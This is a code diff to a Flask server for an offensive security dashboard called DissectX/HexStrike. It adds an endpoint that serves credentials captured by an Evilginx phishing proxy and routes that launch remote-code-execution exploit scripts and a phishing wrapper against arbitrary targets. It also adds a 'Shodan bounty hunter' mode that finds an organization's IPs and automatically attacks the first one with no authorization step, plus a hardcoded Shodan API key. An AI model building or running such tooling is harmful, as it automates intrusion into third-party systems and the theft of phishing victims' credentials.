@@ -10,6 +10,10 @@ import tempfile
 import logging
 from flask_socketio import SocketIO, emit
 from flask_cors import CORS
+from dotenv import load_dotenv
+
+# Load environment variables
+load_dotenv()
 
 # Import HexStrike Engine
 from src.hexstrike.engine import IntelligentDecisionEngine
@@ -61,15 +65,20 @@ class WebUIServer:
         CORS(self.app)  # Enable CORS for all routes
         self.app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 1024  # 1GB max file size
         self.app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dissectx_production_secret_key') # Required for SocketIO
-        self.socketio = SocketIO(self.app, cors_allowed_origins="*", async_mode='threading', allow_unsafe_werkzeug=True)
+        self.socketio = SocketIO(self.app, cors_allowed_origins="*", async_mode=None)
         self.analysis_results = analysis_results or {}
         self.port = 8080
         
         # Initialize HexStrike Engine
-        self.engine = IntelligentDecisionEngine()
+        self.hexstrike_engine = IntelligentDecisionEngine()
         
         # Initialize VulnChain Scanner
         self.vulnchain_scanner = VulnChainScanner(self.socketio)
+
+        # Initialize Shodan Service
+        from src.hexstrike.shodan_service import ShodanService
+        shodan_key = os.environ.get('SHODAN_API_KEY', 'FdLFiRL51rmiOeA1zgxYtqf1UJwZhzxT')
+        self.shodan = ShodanService(shodan_key)
         
         # Initialize Tool Executor for real-world automated tasks
         from src.utils.executor import ToolExecutor
@@ -125,7 +134,7 @@ class WebUIServer:
         """Run the server using SocketIO"""
         self.port = port
         print(f"🌐 DissectX + HexStrike Server running on http://{host}:{port}")
-        self.socketio.run(self.app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True, **kwargs)
+        self.socketio.run(self.app, host=host, port=port, debug=debug, **kwargs)
     
     def _get_template_folder(self) -> str:
         """Get the path to the templates folder"""
@@ -142,6 +151,48 @@ class WebUIServer:
                 with open(self.scans_db_path, 'r') as f:
                     return json.load(f)
             except Exception:
+                return []
+        return []
+
+    def _get_config(self):
+        """Helper to read global configuration"""
+        config_path = Path(__file__).parent.parent / "deployable_tools" / "config.json"
+        if config_path.exists():
+            try:
+                with open(config_path, 'r') as f:
+                    return json.load(f)
+            except:
+                return {}
+        return {}
+
+    def _save_config(self, new_config):
+        """Helper to save global configuration"""
+        config_path = Path(__file__).parent.parent / "deployable_tools" / "config.json"
+        
+        # Merge with existing
+        current_config = self._get_config()
+        current_config.update(new_config)
+        
+        try:
+            with open(config_path, 'w') as f:
+                json.dump(current_config, f, indent=2)
+            return True
+        except Exception as e:
+            print(f"Error saving config: {e}")
+            return False
+
+    def _get_captured_creds(self):
+        """Helper to read Evilginx captured credentials"""
+        # Resolves to src/deployable_tools/evilginx2/log/captured_creds.json
+        # BINARY_PATH in wrapper is src/deployable_tools/evilginx2/evilginx2
+        base_dir = Path(__file__).parent.parent / "deployable_tools" / "evilginx2" / "log"
+        creds_path = base_dir / "captured_creds.json"
+        
+        if creds_path.exists():
+            try:
+                with open(creds_path, 'r') as f:
+                    return json.load(f)
+            except:
                 return []
         return []
     
@@ -698,6 +749,14 @@ class WebUIServer:
         def api_results():
             """API endpoint to get analysis results as JSON"""
             return jsonify(self.analysis_results)
+
+        @self.app.route('/api/phisher/credentials', methods=['GET'])
+        def api_phisher_credentials():
+            """Return captured phishing credentials"""
+            creds = self._get_captured_creds()
+            # Sort by timestamp desc
+            creds.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
+            return jsonify(creds)
         
         @self.app.route('/upload', methods=['POST'])
         def upload():
@@ -953,7 +1012,7 @@ class WebUIServer:
             print(f"[DEBUG] Server recommend_tools requested for: {target_type_str}")
             try:
                 target_type = TargetType(target_type_str)
-                tools = self.engine.recommend_tools(target_type)
+                tools = self.hexstrike_engine.recommend_tools(target_type)
                 print(f"[DEBUG] HexStrike Engine returned {len(tools)} tools")
                 return jsonify({'tools': tools})
             except ValueError as e:
@@ -1017,8 +1076,8 @@ class WebUIServer:
             res = self.mobile_engine.ssl_pinning_bypass(data.get('device_id'), data.get('package'))
             return jsonify(res)
 
-        @self.app.route('/api/hexstrike/scan', methods=['POST'])
-        def start_scan():
+        # @self.app.route('/api/hexstrike/scan', methods=['POST'])
+        def start_scan_OLD():
             """Start a real-world automated scan using industry tools"""
             data = request.json
             target = data.get('target', '')
@@ -1064,6 +1123,11 @@ class WebUIServer:
                 'nuclei': [get_tool_path('nuclei'), '-u', clean_target, '-silent'],
                 'sqlmap': [get_tool_path('sqlmap'), '-u', clean_target, '--batch', '--random-agent'],
                 'nikto': [get_tool_path('nikto'), '-h', clean_target],
+                # Custom Exploits
+                'react2shell': ['python3', str(Path(__file__).parent.parent / 'deployable_tools' / 'react2shell.py'), '-t', clean_target, '-c', 'id'],
+                'n8n_rce': ['python3', str(Path(__file__).parent.parent / 'deployable_tools' / 'n8n_rce.py'), '-t', clean_target, '-c', 'id'],
+                'n8n_scanner': ['python3', str(Path(__file__).parent.parent / 'deployable_tools' / 'cve_2025_68613_scanner.py'), '-u', clean_target],
+            'evilginx2': ['python3', '-u', str(Path(__file__).parent.parent / 'deployable_tools' / 'evilginx_wrapper.py'), '-t', clean_target],
             }
             
             if wordlist:
@@ -1088,6 +1152,92 @@ class WebUIServer:
                 'message': f'Automated {tool} assessment initiated on {clean_target}'
             })
 
+        @self.app.route('/api/hexstrike/scan', methods=['POST'])
+        def start_scan():
+            """Start a real-world automated scan using industry tools"""
+            try:
+                print("[DEBUG] Received start_scan request", flush=True)
+                data = request.json
+                target = data.get('target', '')
+                tool = data.get('tool', 'nmap')
+                
+                from src.utils.executor import ToolExecutor
+                clean_target = ToolExecutor.sanitize_target(target)
+                
+                if not clean_target:
+                    return jsonify({'error': 'Invalid target specified'}), 400
+
+                import shutil
+                
+                def get_tool_path(name):
+                    path = shutil.which(name)
+                    if path: return path
+                    # Fallbacks for common locations if which fails
+                    fallbacks = [
+                        f"/opt/homebrew/bin/{name}",
+                        f"/usr/local/bin/{name}",
+                        f"/usr/bin/{name}",
+                        os.path.expanduser(f"~/go/bin/{name}")
+                    ]
+                    for f in fallbacks:
+                        if os.path.exists(f): return f
+                    return name
+
+                def get_wordlist_path():
+                    common_paths = [
+                        "/usr/share/wordlists/dirb/common.txt", # Kali
+                        "/usr/share/wordlists/common.txt",
+                        "/opt/homebrew/share/wordlists/common.txt",
+                        str(Path(__file__).parent / 'wordlist_bootstrap.txt') # Local Bootstrap
+                    ]
+                    for p in common_paths:
+                        if os.path.exists(p): return p
+                    return None
+
+                wordlist = get_wordlist_path()
+                
+                # Map tools to their actual commands
+                tool_map = {
+                    'nmap': [get_tool_path('nmap'), '-sV', '-Pn', '--top-ports', '1000', clean_target],
+                    'nuclei': [get_tool_path('nuclei'), '-u', clean_target, '-silent'],
+                    'sqlmap': [get_tool_path('sqlmap'), '-u', clean_target, '--batch', '--random-agent'],
+                    'nikto': [get_tool_path('nikto'), '-h', clean_target],
+                    # Custom Exploits
+                    'react2shell': ['python3', str(Path(__file__).parent.parent / 'deployable_tools' / 'react2shell.py'), '-t', clean_target, '-c', 'id'],
+                    'n8n_rce': ['python3', str(Path(__file__).parent.parent / 'deployable_tools' / 'n8n_rce.py'), '-t', clean_target, '-c', 'id'],
+                    'n8n_scanner': ['python3', str(Path(__file__).parent.parent / 'deployable_tools' / 'cve_2025_68613_scanner.py'), '-u', clean_target],
+                    'evilginx2': ['python3', '-u', str(Path(__file__).parent.parent / 'deployable_tools' / 'evilginx_wrapper.py'), '-t', clean_target],
+                }
+                
+                if wordlist:
+                    tool_map['ffuf'] = [get_tool_path('ffuf'), '-u', f"{clean_target}/FUZZ", '-w', wordlist]
+                else:
+                    # Fallback ffuf without wordlist without using a default if we can't find one
+                    tool_map['ffuf'] = [get_tool_path('ffuf'), '-u', f"{clean_target}/FUZZ"]
+                
+                tool_key = tool.lower()
+                if tool_key not in tool_map:
+                    # Fallback to just running the tool name with the target
+                    cmd = [tool_key, clean_target]
+                else:
+                    cmd = tool_map[tool_key]
+                    
+                task_id = f"{tool_key}_{int(datetime.now().timestamp())}"
+                print(f"[DEBUG] Executing command: {cmd}", flush=True)
+                self.tool_executor.execute(tool, cmd, task_id)
+                
+                return jsonify({
+                    'status': 'started', 
+                    'task_id': task_id,
+                    'message': f'Automated {tool} assessment initiated on {clean_target}'
+                })
+            except Exception as e:
+                import traceback
+                error_msg = f"Server Error during start_scan: {str(e)}\n{traceback.format_exc()}"
+                print(error_msg, flush=True)
+                self.socketio.emit('log', {'data': error_msg, 'level': 'ERROR'})
+                return jsonify({'error': str(e)}), 500
+
         @self.app.route('/api/hexstrike/autonomous', methods=['POST'])
         def start_autonomous_mission():
             """Launch a multi-phase AI-driven autonomous assessment"""
@@ -1102,7 +1252,26 @@ class WebUIServer:
                 return jsonify({'error': 'Invalid target specified'}), 400
             
             # Fetch attack patterns from the HexStrike Engine
-            patterns = self.hexstrike_engine.attack_patterns.get(mission_type, [])
+            # Handle Shodan Bounty Hunter Mode
+            if mission_type == 'shodan_bounty_hunter':
+                self.socketio.emit('log', {'data': f"[SHODAN] 🌍 Hunting assets for organization/query: {clean_target}...", 'level': 'INFO'})
+                shodan_results = self.shodan.search_organization(clean_target, limit=5)
+                
+                if 'matches' in shodan_results and shodan_results['matches']:
+                    targets = [m['ip'] for m in shodan_results['matches']]
+                    self.socketio.emit('log', {'data': f"[SHODAN] 🎯 Identified {len(targets)} potential targets: {', '.join(targets)}", 'level': 'SUCCESS'})
+                    
+                    # Pick first target for the autonomous mission
+                    real_target = targets[0]
+                    self.socketio.emit('log', {'data': f"[HEXSTRIKE] ⚔️ Engaging primary target: {real_target}", 'level': 'WARNING'})
+                    
+                    clean_target = real_target
+                    patterns = self.hexstrike_engine.attack_patterns.get('weaponized_exploitation', [])
+                else:
+                    self.socketio.emit('log', {'data': f"[SHODAN] ❌ No targets found for {clean_target}", 'level': 'ERROR'})
+                    return jsonify({'error': 'No targets found via Shodan'}), 404
+            else:
+                patterns = self.hexstrike_engine.attack_patterns.get(mission_type, [])
             
             if not patterns:
                 return jsonify({'error': 'Unknown mission type or no patterns found'}), 404
@@ -1490,6 +1659,38 @@ class WebUIServer:
                 return jsonify({'error': str(e)}), 500
 
         # ============================================================================
+        # SHODAN INTELLIGENCE ROUTES
+        # ============================================================================
+
+        @self.app.route('/api/shodan/search', methods=['POST'])
+        def search_shodan():
+            """Search Shodan for organizations or queries"""
+            data = request.json
+            query = data.get('query')
+            if not query:
+                return jsonify({'error': 'Query required'}), 400
+            
+            print(f"[DEBUG] Shodan Org Search Query: {query}")
+            results = self.shodan.search_organization(query, limit=100)
+            print(f"[DEBUG] Shodan Results: {results}")
+            return jsonify(results)
+
+        @self.app.route('/api/shodan/cve', methods=['POST'])
+        def search_cve():
+            """Search Shodan for specific CVEs"""
+            data = request.json
+            cve_id = data.get('cve_id')
+            query = data.get('query', '')
+            
+            if not cve_id:
+                return jsonify({'error': 'CVE ID required'}), 400
+                
+            print(f"[DEBUG] Shodan CVE Search: {cve_id} (Query: {query})")
+            results = self.shodan.search_cve(cve_id, query, limit=100)
+            print(f"[DEBUG] Shodan CVE Results: {results}")
+            return jsonify(results)
+
+        # ============================================================================
         # SECURITY RESEARCH ROUTES
         # ============================================================================
 
@@ -1853,7 +2054,7 @@ class WebUIServer:
         self.port = port
         print(f"Starting DissectX Web UI on http://localhost:{port}")
         print(f"Press Ctrl+C to stop the server")
-        self.app.run(host='0.0.0.0', port=port, debug=debug)
+        self.socketio.run(self.app, host='0.0.0.0', port=port, debug=debug)
     
     def generate_report(self, analysis_results: Dict[str, Any]) -> str:
         """
